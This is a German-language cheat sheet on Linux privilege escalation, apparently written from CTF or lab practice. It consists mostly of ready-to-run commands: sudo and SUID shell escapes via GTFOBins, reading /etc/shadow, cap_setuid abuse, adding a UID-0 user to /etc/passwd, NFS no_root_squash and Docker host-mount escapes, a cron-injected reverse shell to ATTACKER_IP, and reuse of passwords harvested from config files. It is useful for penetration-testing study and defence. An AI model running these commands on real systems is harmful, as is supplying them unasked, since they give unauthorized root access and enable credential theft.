# Privilege-Escalation

## 1. Ziel der Privilege-Escalation Phase

- Von unprivilegiertem User zu root-Zugriff eskalieren
- Ausnutzung von Misconfigurations
- SUID Binaries
- Sudo-Rechten
- Capabilities
- Cron Jobs
---

## 2. Relevante Techniken & Vorgehensweisen

### Sudo Misconfiguration

- Ausnutzung von NOPASSWD Sudo-Rechten
- GTFOBins für Sudo-Binaries
- Sudo-Injection via apt, zip, base64, find

### SUID/SGID Binary Exploitation

- Find SUID Binaries
- GTFOBins SUID Section
- Custom SUID Binaries analysieren

### Capabilities Misuse

- Capabilities auf Binaries identifizieren
- cap_setuid für UID-Manipulation

### Cron Job Exploitation

- Writable Scripts in Cron Jobs
- Root-owned Cron Jobs hijacken

### PATH Hijacking

- Relative Paths in Scripts ausnutzen
- Fake Binary in PATH platzieren

### Writable Files

- /etc/passwd Manipulation
- Systemd Service Files
- Init Scripts

### NFS Root Squash Misconfiguration

- no_root_squash auf NFS Exports
- SUID Binary über NFS Mount

### Container Escape

- Docker Privileged Container
- Volume Mount Misconfiguration
- no_root_squash in Container-zu-Host Mounts

### Password Reuse

- Credentials aus Config Files
- Environment Variables
- Database Credentials für System-User

---

## 3. Betriebssystem-spezifische Aspekte (Linux)

- Sudo-System für privilegierte Befehlsausführung
- SUID Bit (Set User ID) für Binary-Owner Execution
- Capabilities als granulare Alternative zu SUID
- Cron für geplante Tasks
- /etc/passwd für User-Verwaltung
- NFS für Network File Sharing
- Docker Container mit Host-Interaktion

---

## 4. Typische Angriffsflächen / Ansatzpunkte

### Sudo Permissions

- `(ALL) NOPASSWD:` für kritische Binaries
- apt, zip, base64, find, vi, nano mit Sudo

### SUID Binaries

- /usr/bin/find
- /usr/bin/php
- /usr/bin/python
- Custom Binaries in /usr/local/bin

### Capabilities

- cap_setuid+ep auf Python/PHP

### Cron Jobs

- World-writable oder User-writable Scripts
- Scripts ohne absolute Paths

### Writable System Files

- /etc/passwd (wenn writable)
- /etc/sudoers (wenn writable)
- Init/Systemd Scripts

### NFS Exports

- no_root_squash Configuration
- World-accessible Mounts

### Docker Misconfiguration

- Privileged Container mit sudo docker exec
- Volume Mounts mit RW-Rechten
- User Namespace Remapping deaktiviert

---

## 5. Wichtige Befehle, Tools & Syntax

### Sudo Exploitation

**Sudo Enumeration**


```bash
sudo -l
```

**APT Sudo Exploitation**

**Methode 1: apt changelog**


```bash
sudo apt changelog apt
# Im Pager (less): Drücke !
# Dann eingeben:
bash
# Oder direkt:
!/bin/bash
```

**Methode 2: Pre-Invoke Hook**


```bash
TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt install -c $TF sl
```

**Methode 3: Update Hook**


```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

**ZIP Sudo Exploitation**


```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

**BASE64 Sudo Exploitation**


```bash
LFILE=/etc/shadow
sudo base64 "$LFILE" | base64 --decode
```

**FIND Sudo Exploitation**


```bash
sudo find . -exec /bin/sh \; -quit
```

### SUID Binary Exploitation

**SUID Discovery**


```bash
find / -perm -4000 -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

**Find SUID**


```bash
find . -exec /bin/sh -p \; -quit
```

**PHP SUID**


```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

**Python SUID**


```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**CP SUID (/etc/passwd Manipulation)**

**Schritt 1: /etc/passwd backup**


```bash
cat /etc/passwd > passwd.txt
```

**Schritt 2: Neuen root User erstellen**


```bash
# Passwort-Hash generieren
openssl passwd toor
# Output: e6WuwLOzqf252

# Root-User Zeile erstellen
echo "root2:e6WuwLOzqf252:0:0:root:/root:/bin/bash" > /tmp/newuser
```

**Schritt 3: Original /etc/passwd mit neuem User**


```bash
LFILE=/etc/passwd
cat passwd.txt > /tmp/original_passwd
echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /tmp/original_passwd
cp /tmp/original_passwd $LFILE
```

**Schritt 4: Su zu root2**


```bash
su root2
# Password: toor
```

### Capabilities Exploitation

**Capabilities Enumeration**


```bash
getcap -r / 2>/dev/null
```

**Python cap_setuid**


```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### Cron Job Exploitation

**Cron Enumeration**


```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

**pspy für Cron Discovery**


```bash
cd /tmp
wget http://ATTACKER_IP/pspy64
chmod +x pspy64
./pspy64
```

**Script Modification**


```bash
# Backup original
mv script.sh script.sh.bak

# Reverse Shell erstellen
nano script.sh
```


```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```


```bash
# Executable
chmod +x script.sh
```

**Listener**


```bash
nc -lvnp PORT
```

### PATH Hijacking

**PATH Check**


```bash
echo $PATH
```

**Custom Binary in /tmp**


```bash
cd /tmp
export PATH=/tmp:$PATH
```

**Fake Python3 erstellen**


```bash
nano python3
```


```bash
#!/bin/bash
/bin/bash
```


```bash
chmod +x python3
```

**SUID Binary ausführen**


```bash
/usr/local/bin/log_collector
```

### Writable Files Exploitation

**Writable /etc/passwd**


```bash
# Neuen root User hinzufügen
echo "hacker:`openssl passwd -1 password`:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker
```

### NFS Root Squash Exploitation

**NFS Enumeration**


```bash
showmount -e TARGET_IP
nxc nfs TARGET_IP
# Check für: (root escape:True)
```

**NFS Mount (als root auf Kali)**


```bash
sudo su
mount -t nfs TARGET_IP:/home/bob mount
```

**SUID Binary platzieren**


```bash
cd mount
cp /bin/bash .
chmod u+s bash
ls -la bash
# -rwsr-xr-x 1 root root
```

**Auf Target (via SSH als bob)**


```bash
cd /home/bob
ls -la bash
./bash -p
whoami
# root
```

### Docker Container Escape

**Container Detection**


```bash
ls -la /
# Check für .dockerenv File
hostname
# Zeigt Container-ID (z.B. e6ff5b1cbc85)
```

**Sudo Docker Exec (Privileged)**

**Voraussetzung: User hat sudo docker exec**


```bash
sudo -l
# Output: (root) NOPASSWD: /snap/bin/docker exec *
```

**Schritt 1: Container-ID ermitteln**


```bash
# Via LFI oder Enumeration
# Beispiel: e6ff5b1cbc85
```

**Schritt 2: Als root in Container**


```bash
sudo /snap/bin/docker exec -it --privileged -u root e6ff5b1cbc85 bash
```

**Schritt 3: Host Filesystem mounten**


```bash
mkdir -p /mnt/host
mount /dev/xvda1 /mnt/host
ls -la /mnt/host
```

**Schritt 4: Root Flag oder Shell**


```bash
cat /mnt/host/root/root.txt
```

**Container mit Volume Mount (via Reverse Shell im Container)**

**Schritt 1: Mount Points finden**


```bash
findmnt | grep "/var/www/html"
# Output: /var/www/html  /dev/root[/opt/limesurvey] ext4  rw,relatime
```

**Schritt 2: Als root im Container**


```bash
sudo su
```

**Schritt 3: SUID Binary im Shared Mount**


```bash
cd /var/www/html/survey
cp /bin/bash ./pwn
chmod u+s ./pwn
ls -la pwn
# -rwsr-xr-x 1 root root
```

**Schritt 4: Auf Host (via SSH)**


```bash
cd /opt/limesurvey
ls -la pwn
# -rwsr-xr-x 1 root root
./pwn -p
whoami
# root
```

### Password Reuse

**Credentials aus Tomcat Config**


```bash
cat /opt/tomcat/conf/tomcat-users.xml
```

**Beispiel Output:**


```xml
<user username="admin" password="H2RR3rGDrbAnPxWa" roles="manager-gui"/>
```

**Su zu root**


````bash
su root
# Password: H2RR3rGDrbAnPxWa
```

### GTFOBins Reference

**Website:**
```
https://gtfobins.github.io/
````

**Sections:**

- Sudo
- SUID
- Capabilities
- File Upload
- File Download
- File Write
- File Read

---

## 6. Reihenfolge, Abhängigkeiten & Hinweise

### Standard Privilege Escalation Workflow

1. **Initial Enumeration**


```bash
   sudo -l
   find / -perm -4000 -type f 2>/dev/null
   getcap -r / 2>/dev/null
```

2. **Quick Win Check**
    - Sudo Permissions
    - Bekannte SUID Binaries
    - Capabilities
3. **Automated Scanning**


```bash
   cd /tmp
   wget http://ATTACKER_IP/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
```

4. **Process Monitoring (wenn nötig)**


```bash
   cd /tmp
   wget http://ATTACKER_IP/pspy64
   chmod +x pspy64
   ./pspy64
```

5. **Exploitation**
    - GTFOBins für gefundene Binaries
    - Script Modification für Cron
    - Binary Planting für PATH
    - SUID/NFS für Container Escape
6. **Root Verification**


````bash
   whoami
   id
   cat /root/root.txt
```

### Wichtige Hinweise

**Sudo -l Interpretation**
```
(ALL) NOPASSWD: /usr/bin/apt
````

- Kein Passwort erforderlich
- Binary exakt wie angegeben ausführen
- GTFOBins → Sudo Section

**SUID Exploitation**

- `-p` Flag bei Shells wichtig (preserve privileges)
- Ohne `-p` verliert man effective UID
- `sh -p` oder `bash -p`

**Beispiel:**


```bash
# Falsch:
./bash
whoami  # Zeigt Original-User

# Richtig:
./bash -p
whoami  # root
```

**Container Detection Indicators**

- `.dockerenv` File in `/`
- Hostname ist Container-ID (z.B. e6ff5b1cbc85)
- Limitierte Prozesse in `ps aux`

**Mount Point Analysis**


```bash
findmnt
```

- Zeigt alle Mount Points
- Suche nach Shared Directories zwischen Container/Host
- Format: `CONTAINER_PATH DEVICE[HOST_PATH]`

**User Namespace Remapping Check**


````bash
# Im Container als root Datei erstellen
touch /shared/test.txt

# Auf Host checken
ls -la /shared/test.txt
# Wenn Owner root = KEIN Remapping = Exploitable
```

**NFS no_root_squash**
- Wenn `root escape:True` → no_root_squash aktiv
- Root im Container = Root auf Host über NFS Mount
- SUID Binary platzieren funktioniert

**Password Reuse Testing**
- Immer Config Files nach Credentials durchsuchen
- Format: `username:password`
- Credentials testen: root, ubuntu, admin

**PATH Hijacking Requirements**
- Script muss relative Binary-Names verwenden
- User muss PATH modifizieren können
- Script muss mit höheren Rechten ausgeführt werden

**Cron Job Exploitation Timing**
- pspy mindestens 2-3 Minuten laufen lassen
- Cron Jobs oft im 1-5 Minuten Intervall
- Script Modification VOR nächstem Cron Run

**GTFOBins Workflow**
1. Binary-Name auf GTFOBins suchen
2. Richtige Section wählen (Sudo/SUID/Capabilities)
3. Command kopieren
4. Paths/Parameters anpassen
5. Ausführen

**Snapshot vor destructiven Actions**
- `/etc/passwd` Manipulation kann System brechen
- CP SUID Exploitation ist destructiv
- Backup vor Änderungen

---

## 7. Typische Findings & Fehler

### Häufige Findings

**Sudo Misconfiguration**
```
(ALL) NOPASSWD: /usr/bin/apt, /usr/bin/zip, /usr/bin/base64, /usr/bin/find
```

**SUID Binaries**
```
/usr/bin/find
/usr/bin/php7.3
/usr/bin/python3.8
/usr/bin/cp
/usr/local/bin/log_collector
```

**Capabilities**
```
/usr/bin/python3.8 = cap_setuid+ep
```

**Writable Cron Scripts**
```
-rwxr-xr-x 1 grimmie grimmie 79 backup.sh
# Wird von root ausgeführt
```

**NFS Exports mit no_root_squash**
```
/home/bob * (no_root_squash,rw)
```

**Docker Privileged Access**
```
(root) NOPASSWD: /snap/bin/docker exec *
```

**Password Reuse**
- Tomcat Password = Root Password
- Database Password = System User Password

**Volume Mounts ohne User Namespace Remapping**
```
/var/www/html/survey  /dev/root[/opt/limesurvey] ext4  rw
````

### Typische Fehler

**SUID -p Flag vergessen**


```bash
# Falsch:
./bash
# UID bleibt unprivileged

# Richtig:
./bash -p
# UID = 0 (root)
```

**Sudo Binary Path nicht exakt**


```bash
# sudo -l Output:
(ALL) NOPASSWD: /usr/bin/find

# Falsch:
sudo find . -exec /bin/sh \; -quit

# Richtig:
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

**GTFOBins falsche Section**

- SUID Binary mit Sudo Section versucht
- Sudo Binary mit SUID Section versucht
- Commands sind unterschiedlich!

**Container nicht erkannt**

- `.dockerenv` File übersehen
- Mount Points nicht analysiert
- Direkt auf Host-root versucht

**PATH Hijacking: Binary nicht executable**


```bash
# Fake Binary erstellt, aber:
# Falsch:
nano python3
# (nicht executable)

# Richtig:
nano python3
chmod +x python3
```

**NFS Mount: Als non-root gemountet**


```bash
# Falsch:
mount -t nfs TARGET:/share mount
# Fehler: Permission denied

# Richtig:
sudo mount -t nfs TARGET:/share mount
```

**Cron Script: Kein Listener gestartet**

- Reverse Shell im Script
- Aber kein `nc -lvnp PORT` auf Kali
- Cron läuft, aber keine Connection

**Docker Escape: Falsches Device gemountet**


```bash
# Host Filesystem oft auf /dev/xvda1 oder /dev/sda1
mount /dev/xvda1 /mnt/host

# Bei Fehler andere Devices probieren:
ls -la /dev/
mount /dev/sda1 /mnt/host
```

**LinPEAS Output ignoriert**

- Red/Yellow Findings übersehen
- Sections nicht vollständig durchgegangen
- Sudo/SUID/Capabilities nicht alle geprüft

**/etc/passwd Manipulation: Syntax-Fehler**


```bash
# Falsch: Felder fehlen
echo "root2:hash:0:0" >> /etc/passwd

# Richtig: Alle 7 Felder
echo "root2:hash:0:0:root:/root:/bin/bash" >> /etc/passwd
```

**Capabilities Exploitation ohne setuid**


```bash
# cap_setuid vorhanden, aber:
# Falsch:
python3 -c 'import os; os.system("/bin/sh")'
# Bleibt unprivileged

# Richtig:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```


